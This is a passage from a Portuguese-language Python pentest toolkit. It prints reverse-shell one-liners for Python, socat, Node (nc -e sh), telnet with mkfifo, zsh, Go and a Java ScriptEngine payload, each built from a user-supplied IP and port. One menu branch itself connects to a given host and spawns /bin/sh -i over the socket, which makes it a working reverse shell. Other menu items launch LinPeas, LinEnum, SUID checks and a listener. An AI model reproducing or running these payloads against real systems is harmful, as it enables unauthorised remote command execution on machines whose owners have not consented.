            python = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(ip,porta)
            socat = """socat TCP:{}:{} EXEC:sh""".format(ip,porta)
            socat_tty = """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip,porta)
            node = """require('child_process').exec('nc -e sh {} {}')""".format(ip,porta)
            javascript = """String command = "var host = 'SEUIP';" +
                        "var port = SUAPORTA;" +
                        "var cmd = 'sh';"+
                        "var s = new java.net.Socket(host, port);" +
                        "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                        "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                        "var po = p.getOutputStream(), so = s.getOutputStream();"+
                        "print ('Connected');"+
                        "while (!s.isClosed()) {"+
                        "    while (pi.available() > 0)"+
                        "        so.write(pi.read());"+
                        "    while (pe.available() > 0)"+
                        "        so.write(pe.read());"+
                        "    while (si.available() > 0)"+
                        "        po.write(si.read());"+
                        "    so.flush();"+
                        "    po.flush();"+
                        "    java.lang.Thread.sleep(50);"+
                        "    try {"+
                        "        p.exitValue();"+
                        "        break;"+
                        "    }"+
                        "    catch (e) {"+
                        "    }"+
                        "}"+
                        "p.destroy();"+
                        "s.close();";
    String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
    ref.add(new StringRefAddr("x", x);"""
            telnet='TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip,porta)
            zsh = """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(ip,porta)
            golang = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""

            revsit=int(input('Escolha uma opção: '))
            if revsit == 1:
                print('')
                print('|BASH|')
                print('-\033[0;31m',bash,'\033[m')
                print('-\033[0;31m',bash196,'\033[m')
                print('-\033[0;31m',bash_read_line,'\033[m')
                print('-\033[0;31m',bash5,'\033[m')
                print('-\033[0;31m',bash_udp,'\033[m')
                print('')
                input(press)
                reverse_shell()
            elif revsit == 2:
                print('')
                print('-\033[0;31m',nc_mkfifo,'\033[m')
                print('-\033[0;31m',nc,'\033[m');print('')
                input(press)
                reverse_shell()
            elif revsit == 3:
                print('')
                print('|RUST|')
                print('-\033[0;31m',rust,'\033[m')
                print('')
                input(press)
                reverse_shell()
            elif revsit == 4:
                print('')
                print('|PERL|')
                print('-\033[0;31m',perl,'\033[m')
                print('-\033[0;31m',perl_nosh,'\033[m')
                print('')
                input(press)
                reverse_shell()
            elif revsit == 5:
                print('');print('|PHP|')
                print('-\033[0;31m',php,'\033[m')
                print('-\033[0;31m',php_exec,'\033[m')
                print('-\033[0;31m',php_shell,'\033[m')
                print('')
                input(press)
                reverse_shell()
            elif revsit == 6:
                print('');print('|POWERSHELL|');print('-\033[0;31m',power64,'\033[m');print('')
                input(press)
                reverse_shell()
            elif revsit == 7:
                print('');print('|PYTHON|');print('-\033[0;31m',python,'\033[m');print('-\033[0;31m',python_sh,'\033[m');print('')
                input(press)
                reverse_shell()
            elif revsit == 8:
                print('');print('|SOCAT|');print('-\033[0;31m',socat,'\033[m');print('-\033[0;31m',socat_tty,'\033[m');print('')
                input(press)
                reverse_shell()	
            elif revsit == 9:
                print('');print('|NODE|');print('-\033[0;31m',node,'\033[m');print('')
                input(press)
                reverse_shell()		
            elif revsit == 10:
                print('');print('|JAVASCRIPT|');print('-\033[0;31m',javascript,'\033[m');print('')
                input(press)
                reverse_shell()	
            elif revsit == 11:
                print('');print('|TELNET|');print('-\033[0;31m',telnet,'\033[m');print('')
                input(press)
                reverse_shell()	
            elif revsit == 12:
                print('');print('|ZSH|');print('-\033[0;31m',zsh,'\033[m');print('')
                input(press)
                reverse_shell()	
            elif revsit == 13:
                print('')
                print('|GOLANG|')
                print('-\033[0;31m',golang,'\033[m')
                print('')
                input(press)
                reverse_shell()
            elif revsit == 0:
                input(press)
                main()				
            elif revsit > 13:
                print('Digite uma opção válida!')
                input(press)
                reverse_shell()
        elif(sit_rev == 2):
            commander=input('Digite o IP: ')
            porta=int(input('Digite a Porta: '))
            try:
                s.connect((commander,porta))
                print('Conectado com Sucesso!')
                comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
                print(f"Sugestão de comando: {comando}")
                os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
                p=os.system("/bin/sh -i")
            except OSError:
                print('\033[0;31mHost não alcançado\033[m')
        elif(sit_rev == 0):
            input(press)
            main()
    except ValueError as e:
        print('Digite uma opção válida!')
        input(press)
        reverse_shell()
        
#=======================================================================================
def server_tcp():
    try:
        file = open("ARQ/output.txt", "w")
        porta = int(input("Digite a Porta a ser escutada: "))
        try:
            s.bind(("0.0.0.0", porta))
            s.listen(5)
            print("Listening...")
            client_socket, address = s.accept()
            print(f"Received from: {address[0]}")
            data = client_socket.recv(1024).decode()
            file.write(data)
            s.close()
        except Exception as error:
            print("Erro: ", error)
            s.close()
    except FileNotFoundError:
        os.system(dir)
        server_tcp()


#=======================================================================================
def wifi_scan():
    os.system('sudo airmon-ng')


#=======================================================================================
def banner():
    try:
        os.system("clear")
        print(bann)
        print(''' MENU:

 \033[0;34m[1]\033[m - Criar lista de IPs
 \033[0;34m[2]\033[m - Host Discovery
 \033[0;34m[3]\033[m - Hostname Resolve              
 \033[0;34m[4]\033[m - Port Scanner
 \033[0;34m[5]\033[m - NC GET
 \033[0;34m[6]\033[m - WebFinder
 \033[0;34m[7]\033[m - WebCrawler
 \033[0;34m[8]\033[m - ServerHTTP
 \033[0;34m[9]\033[m - Wifi Scanner
 \033[0;34m[10]\033[m- BackUp
 \033[0;34m[11]\033[m- Clonar Part|Disk
 \033[0;34m[12]\033[m- CronTab
 \033[0;34m[13]\033[m- Finder
 \033[0;34m[14]\033[m- Auditor
 \033[0;34m[15]\033[m- Config Tool
 \033[0;34m[16]\033[m- LinPeas
 \033[0;34m[17]\033[m- LinEnum
 \033[0;34m[18]\033[m- SUID
 \033[0;34m[19]\033[m- NC Listen
 \033[0;34m[20]\033[m- Reverse Shell
 \033[0;34m[21]\033[m- Server TCP
 \033[0;34m[22]\033[m- Tryeres
 \033[0;34m[0]\033[m - Sair
''')
        opcao=int(input('Escolha uma opção: '))
        if opcao == 1:
            iplist()
            pass
        elif opcao == 2:
            host_discovery()
            pass
        elif opcao == 3:
            hostname_resolv()
            pass
        elif opcao == 4:
            sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
            if (sit_scan.lower() == 'h'):
                portscan_uniq()
            elif (sit_scan.lower() == 'l'):
                portscan()
            pass
        elif opcao == 5:
            nc_get()
            pass
        elif opcao == 6:
            http_finder()
            pass
        elif opcao == 7:
            link()
            pass
        elif opcao == 8:
            serverhttp()
            pass
        elif opcao == 9:
            wifi_scan()
            pass
        elif opcao == 10:
            backup()
            pass
        elif opcao == 11:
            input("(Configurar)")
            #clonar()
            pass
        elif opcao == 12:
            cron()
            pass
        elif opcao == 13:
            finder()
            pass
        elif opcao == 14:
            infosys()
            pass
        elif opcao == 15:
            config()
            pass
        elif opcao == 16:
            linpeas()
            pass
        elif opcao == 17:
            linenum()
            pass		
        elif opcao == 18:
            suid()
            pass		
        elif opcao == 19:
            nc()
            pass
        elif opcao == 20:
            reverse_shell()
            pass		
        elif opcao == 21:
            server_tcp()
            pass		
        elif opcao == 22:
            os.system('gnome-terminal --title=Python -- sudo python Tryeres/Tryeres.py')
            main()	
        elif opcao == 0:
            print('Volte sempre! ¯\_(ツ)_/¯')
            quit()
        elif opcao > 22:
            print('Digite uma opção válida!')
            input(press)
            main()
            
    except ValueError as e:
        print('Digite uma opção válida!')
        input(press)
        main()
    except NameError:
        print('Digite uma opção válida!')
        input(press)
        main()
        

#=======================================================================================
def main():
    try:
        banner()
    except (KeyboardInterrupt):
        print('\n'+Ctrl_C)
    except ValueError as e:
            print('Digite a opção correta.')
            input('(Pressione qualquer tecla para continuar)')
            main()
main()

